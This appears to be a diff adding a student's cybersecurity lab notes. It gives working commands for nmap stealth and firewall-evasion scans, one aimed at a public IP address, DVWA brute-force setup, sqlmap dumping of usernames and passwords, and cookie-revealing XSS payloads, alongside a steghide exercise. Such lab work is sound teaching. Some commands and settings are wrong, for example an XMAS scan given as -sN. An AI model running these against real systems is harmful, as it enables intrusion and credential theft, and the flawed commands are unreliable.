@@ -1,0 +1,167 @@
+EXP 7
+COMMANDS 
+
+1.PING SCAN (Host Discovery) : nmap -sP 192.168.56.0/24
+2. SYN Scan (Stealth Scan) :    sudo nmap -sS -p 1-1024 192.168.56.20
+3. ACK Scan (Firewall Detection ) : sudo nmap -sA -p 1-1024 192.168.56.20
+4. NULL Scan ( no flags) : sudo nmap -sN -p 1-1024 192.168.56.20
+5. XMAS Scan ((FIN, PSH, URG) : sudo nmap -sN -p 1-1024 192.168.56.20
+
+1. port scanning 
+Port scanning is the process of sending specially crafted packets to a target system to discover which ports are open, closed, or filtered. It's a fundamental step in network reconnaissance and helps security professionals identify services running on a host, potential vulnerabilities, and firewall behavior.
+PING Scan 
+PING Scan checks if a device is online. It sends ICMP (ping) or TCP packets, and if it gets a reply, the system is active.
+3. What is a SYN Scan and why is it called stealthy?
+SYN Scan sends a SYN packet and waits for a reply. If it gets SYN-ACK, the port is open. It doesn't complete the connection, so it's hard to detect — that's why it's stealthy.
+4. How does the ACK scan work and what is its purpose?
+ACK Scan sends only an ACK flag. If the system replies with RST, the port is unfiltered. If there’s no reply, it might be blocked by a firewall..
+5. What is the purpose of the NULL Scan?
+NULL Scan sends a packet with no flags. It checks how the system responds and can help find open or filtered ports, especially on older systems.
+6. Describe the XMAS Scan and why it’s named so.
+XMAS scan (-sX) sends TCP packets with FIN, PSH, and URG flags set. It lights up the packet like a Christmas tree, hence the name. It attempts to identify open ports by checking for the absence of 
+
+EXP 2
+1.	sudo apt install apache2 php php-mysqli mariadb-server git unzip -y
+2.	cd /var/www/html
+3.	sudo git clone https://github.com/digininja/DVWA.git
+4.	sudo chmod -R 755 /var/www/html/DVWA/
+5.	cd /var/www/html/DVWA/config
+6.	sudo cp config.inc.php.dist config.inc.php
+7.	sudo nano config.inc.php 
+8.	change user as admin and password as password and save and exit
+9.	sudo systemctl start mysql
+10.	sudo su
+11.	mysql -u root -p
+12.	create database dvwa;
+13.	create user ‘admin’@’127.0.0.1’ identified by ‘password’;
+14.	grant all privileges on dvwa.* to ‘admin’@’127.0.0.1’;
+15.	exit
+16.	systemctl restart apache2
+17.	cd /etc/php
+18.	ls n then cd 8.4
+19.	nano php.ini
+20.	press control+f and search for fopen 
+21.	url_fopn = on
+22.	url_include = on
+23.	save the file and then again type 
+24.	systemctl restart apache2
+25.	go to browser and type 127.0.0.1/DVWA
+26.	now do the burpsuite condiguration n start attack
+A Brute Force Attack is a method used to guess passwords by trying multiple combinations until 
+the correct one is found. This attack is commonly used against login pages, admin 
+panels, and authentication mechanisms.
+Types of Brute Force Attacks
+1. Simple Brute Force: Tries all possible combinations of passwords.
+2. Dictionary Attack: Uses a predefined list of common passwords.
+3. Hybrid Attack: Combines dictionary words with numbers/special characters.
+4. Credential Stuffing: Uses previously leaked username-password pairs.
+Why is Brute Force Dangerous?
+• Can compromise user accounts if weak passwords are used.
+• May allow access to admin panels or sensitive data.
+• Can be used to escalate privileges within an application.
+
+EXP 3
+ Installation:
+sudo apt update
+sudo apt install sqlmap -y
+http://testphp.vulnweb.com/AJAX/infoartist.php?id=1
+
+🔹 Step 1: Basic SQL Injection Test
+sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" --dbs
+Explanation:
+•	-u: Target URL
+•	--dbs: Enumerates all databases if vulnerable
+
+🔹 Step 2: List Tables from a Specific Database
+sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart --tables
+Explanation:
+•	-D acuart: Target database
+•	--tables: List all tables in the database
+
+🔹 Step 3: List Columns in a Specific Table
+Suppose you found a table called users, then:
+sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart -T users --columns
+Explanation:
+•	-T users: Target table
+•	--columns: List all columns in the table
+
+🔹 Step 4: Dump Specific Column Data
+To extract usernames:
+sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart -T users -C uname --dump
+To extract passwords:
+sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart -T users -C pass –dump
+Related Theory
+What is SQL Injection? 
+SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with an application’s database queries. 
+By injecting malicious SQL statements, an attacker can bypass authentication, retrieve, modify, or delete data, and even execute system-level commands. 
+Types of SQL Injection 
+1. Boolean-Based SQL Injection – Uses conditional statements to determine true/false responses. 
+2. Time-Based SQL Injection – Uses database-specific time delays to infer injection success. 
+3. Error-Based SQL Injection – Exploits database error messages to extract data. 
+4. Union-Based SQL Injection – Uses the UNION SQL operator to fetch data from multiple tables. 
+5. Blind SQL Injection – Extracts data indirectly by analyzing responses or delays. 
+What is SQLMap? 
+SQLMap is an open-source penetration testing tool that automates SQL
+ injection detection and exploitation. It supports multiple database management systems (MySQL, PostgreSQL, Oracle, etc.) and various SQL injection techniques.
+
+EXP4
+1REFLECTED XSS 
+Script 1: Basic JavaScript Popup
+<script>alert('XSS')</script>
+Displays a popup with the message XSS.
+Script 2: Display User's Cookie
+<script>alert(document.cookie)</script>
+Pops up the current session cookie of the logged-in user 
+2 STORED XSS
+SCRIPT 1
+<script>confirm('U R HACKED')</script>
+
+What is XSS?
+Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject 
+malicious scripts into a trusted website, which is then executed in the victim’s browser.
+Types of XSS Attacks
+1. Stored XSS: The malicious script is permanently stored on the server and executed 
+when the victim loads the page.
+2. Reflected XSS: The malicious script is included in a URL and executed when the 
+victim clicks the link.
+3. DOM-Based XSS: The malicious script is executed by modifying the Document 
+Object Model (DOM) in the browser
+
+EXP 8
+STEPS TO PERFORM:
+1.) By Fragmenting the packets with 8 bit data:
+start the wireshark n in filters enter ip n select any one ip address n in terminal type this 
+sudo nmap -sS -Pn -f -F <target_ip> in target ip enter the ip u want to target 
+EXPLANATION :1. The -f option in Nmap allows you to fragment the packets. By default, it will split packets into fragments of 8-byte lengths.
+ 2.This command will send fragmented packets to the target IP address and will attempt to bypass firewalls or intrusion detection systems that might block non-fragmented packets.
+ BY RUNNING THE COMMAND U WILL GET TO SEE THE OPEN PORTS
+ 2.) By generating ip packets with specific length:
+ TYPE THIS IN FILTERS IN WIRESHARK ip.src == 10.0.2.15 && tcp.len > 0
+ then in terminal type this 
+sudo nmap -sS -Pn --data-length <length> -p <port> <target_ip> in length add the lenth of ur ip , port n ip address of destination
+3.) 3. By manipulating the TTL value
+type this in filters of wireshark : ip.ttl <= 64
+then in terminal run : sudo nmap -sS -Pn --ttl <TTL_VALUE> -F <TARGET_IP>
+4.) 4. By sending packets with bogus TCP/UDP checksums
+in filters of wireshark type this : (ip.addr == 10.0.2.15)
+n in terminal type this : sudo nmap -sS -Pn --badsum -p <port(s)> <target_ip>
+sudo nmap -sS -Pn --badsum -p 443 34.149.100.209
+
+EXP 9 
+Commands:
+1.	sudo apt update
+2.	sudo apt install steghide –y
+3.	cd Desktop          (Save a .jpeg image from the browser to the Desktop and an empty file called secret.txt file as well)
+4.	ls
+5.	echo “This is a very nice code” > secret.txt        (The sentence is saved in the secret.txt)
+6.	steghide embed -cf hacker.jpeg -ef secret.txt
+Enter paraphrase(password):abcd
+RE-Enter paraphrase: abcd
+7.	ls –l
+8.	steghide extract -sf hacker.jpeg
+Enter paraphrase: abcd
+9.	cat secret.txt
+This is a very nice code
+
+
+
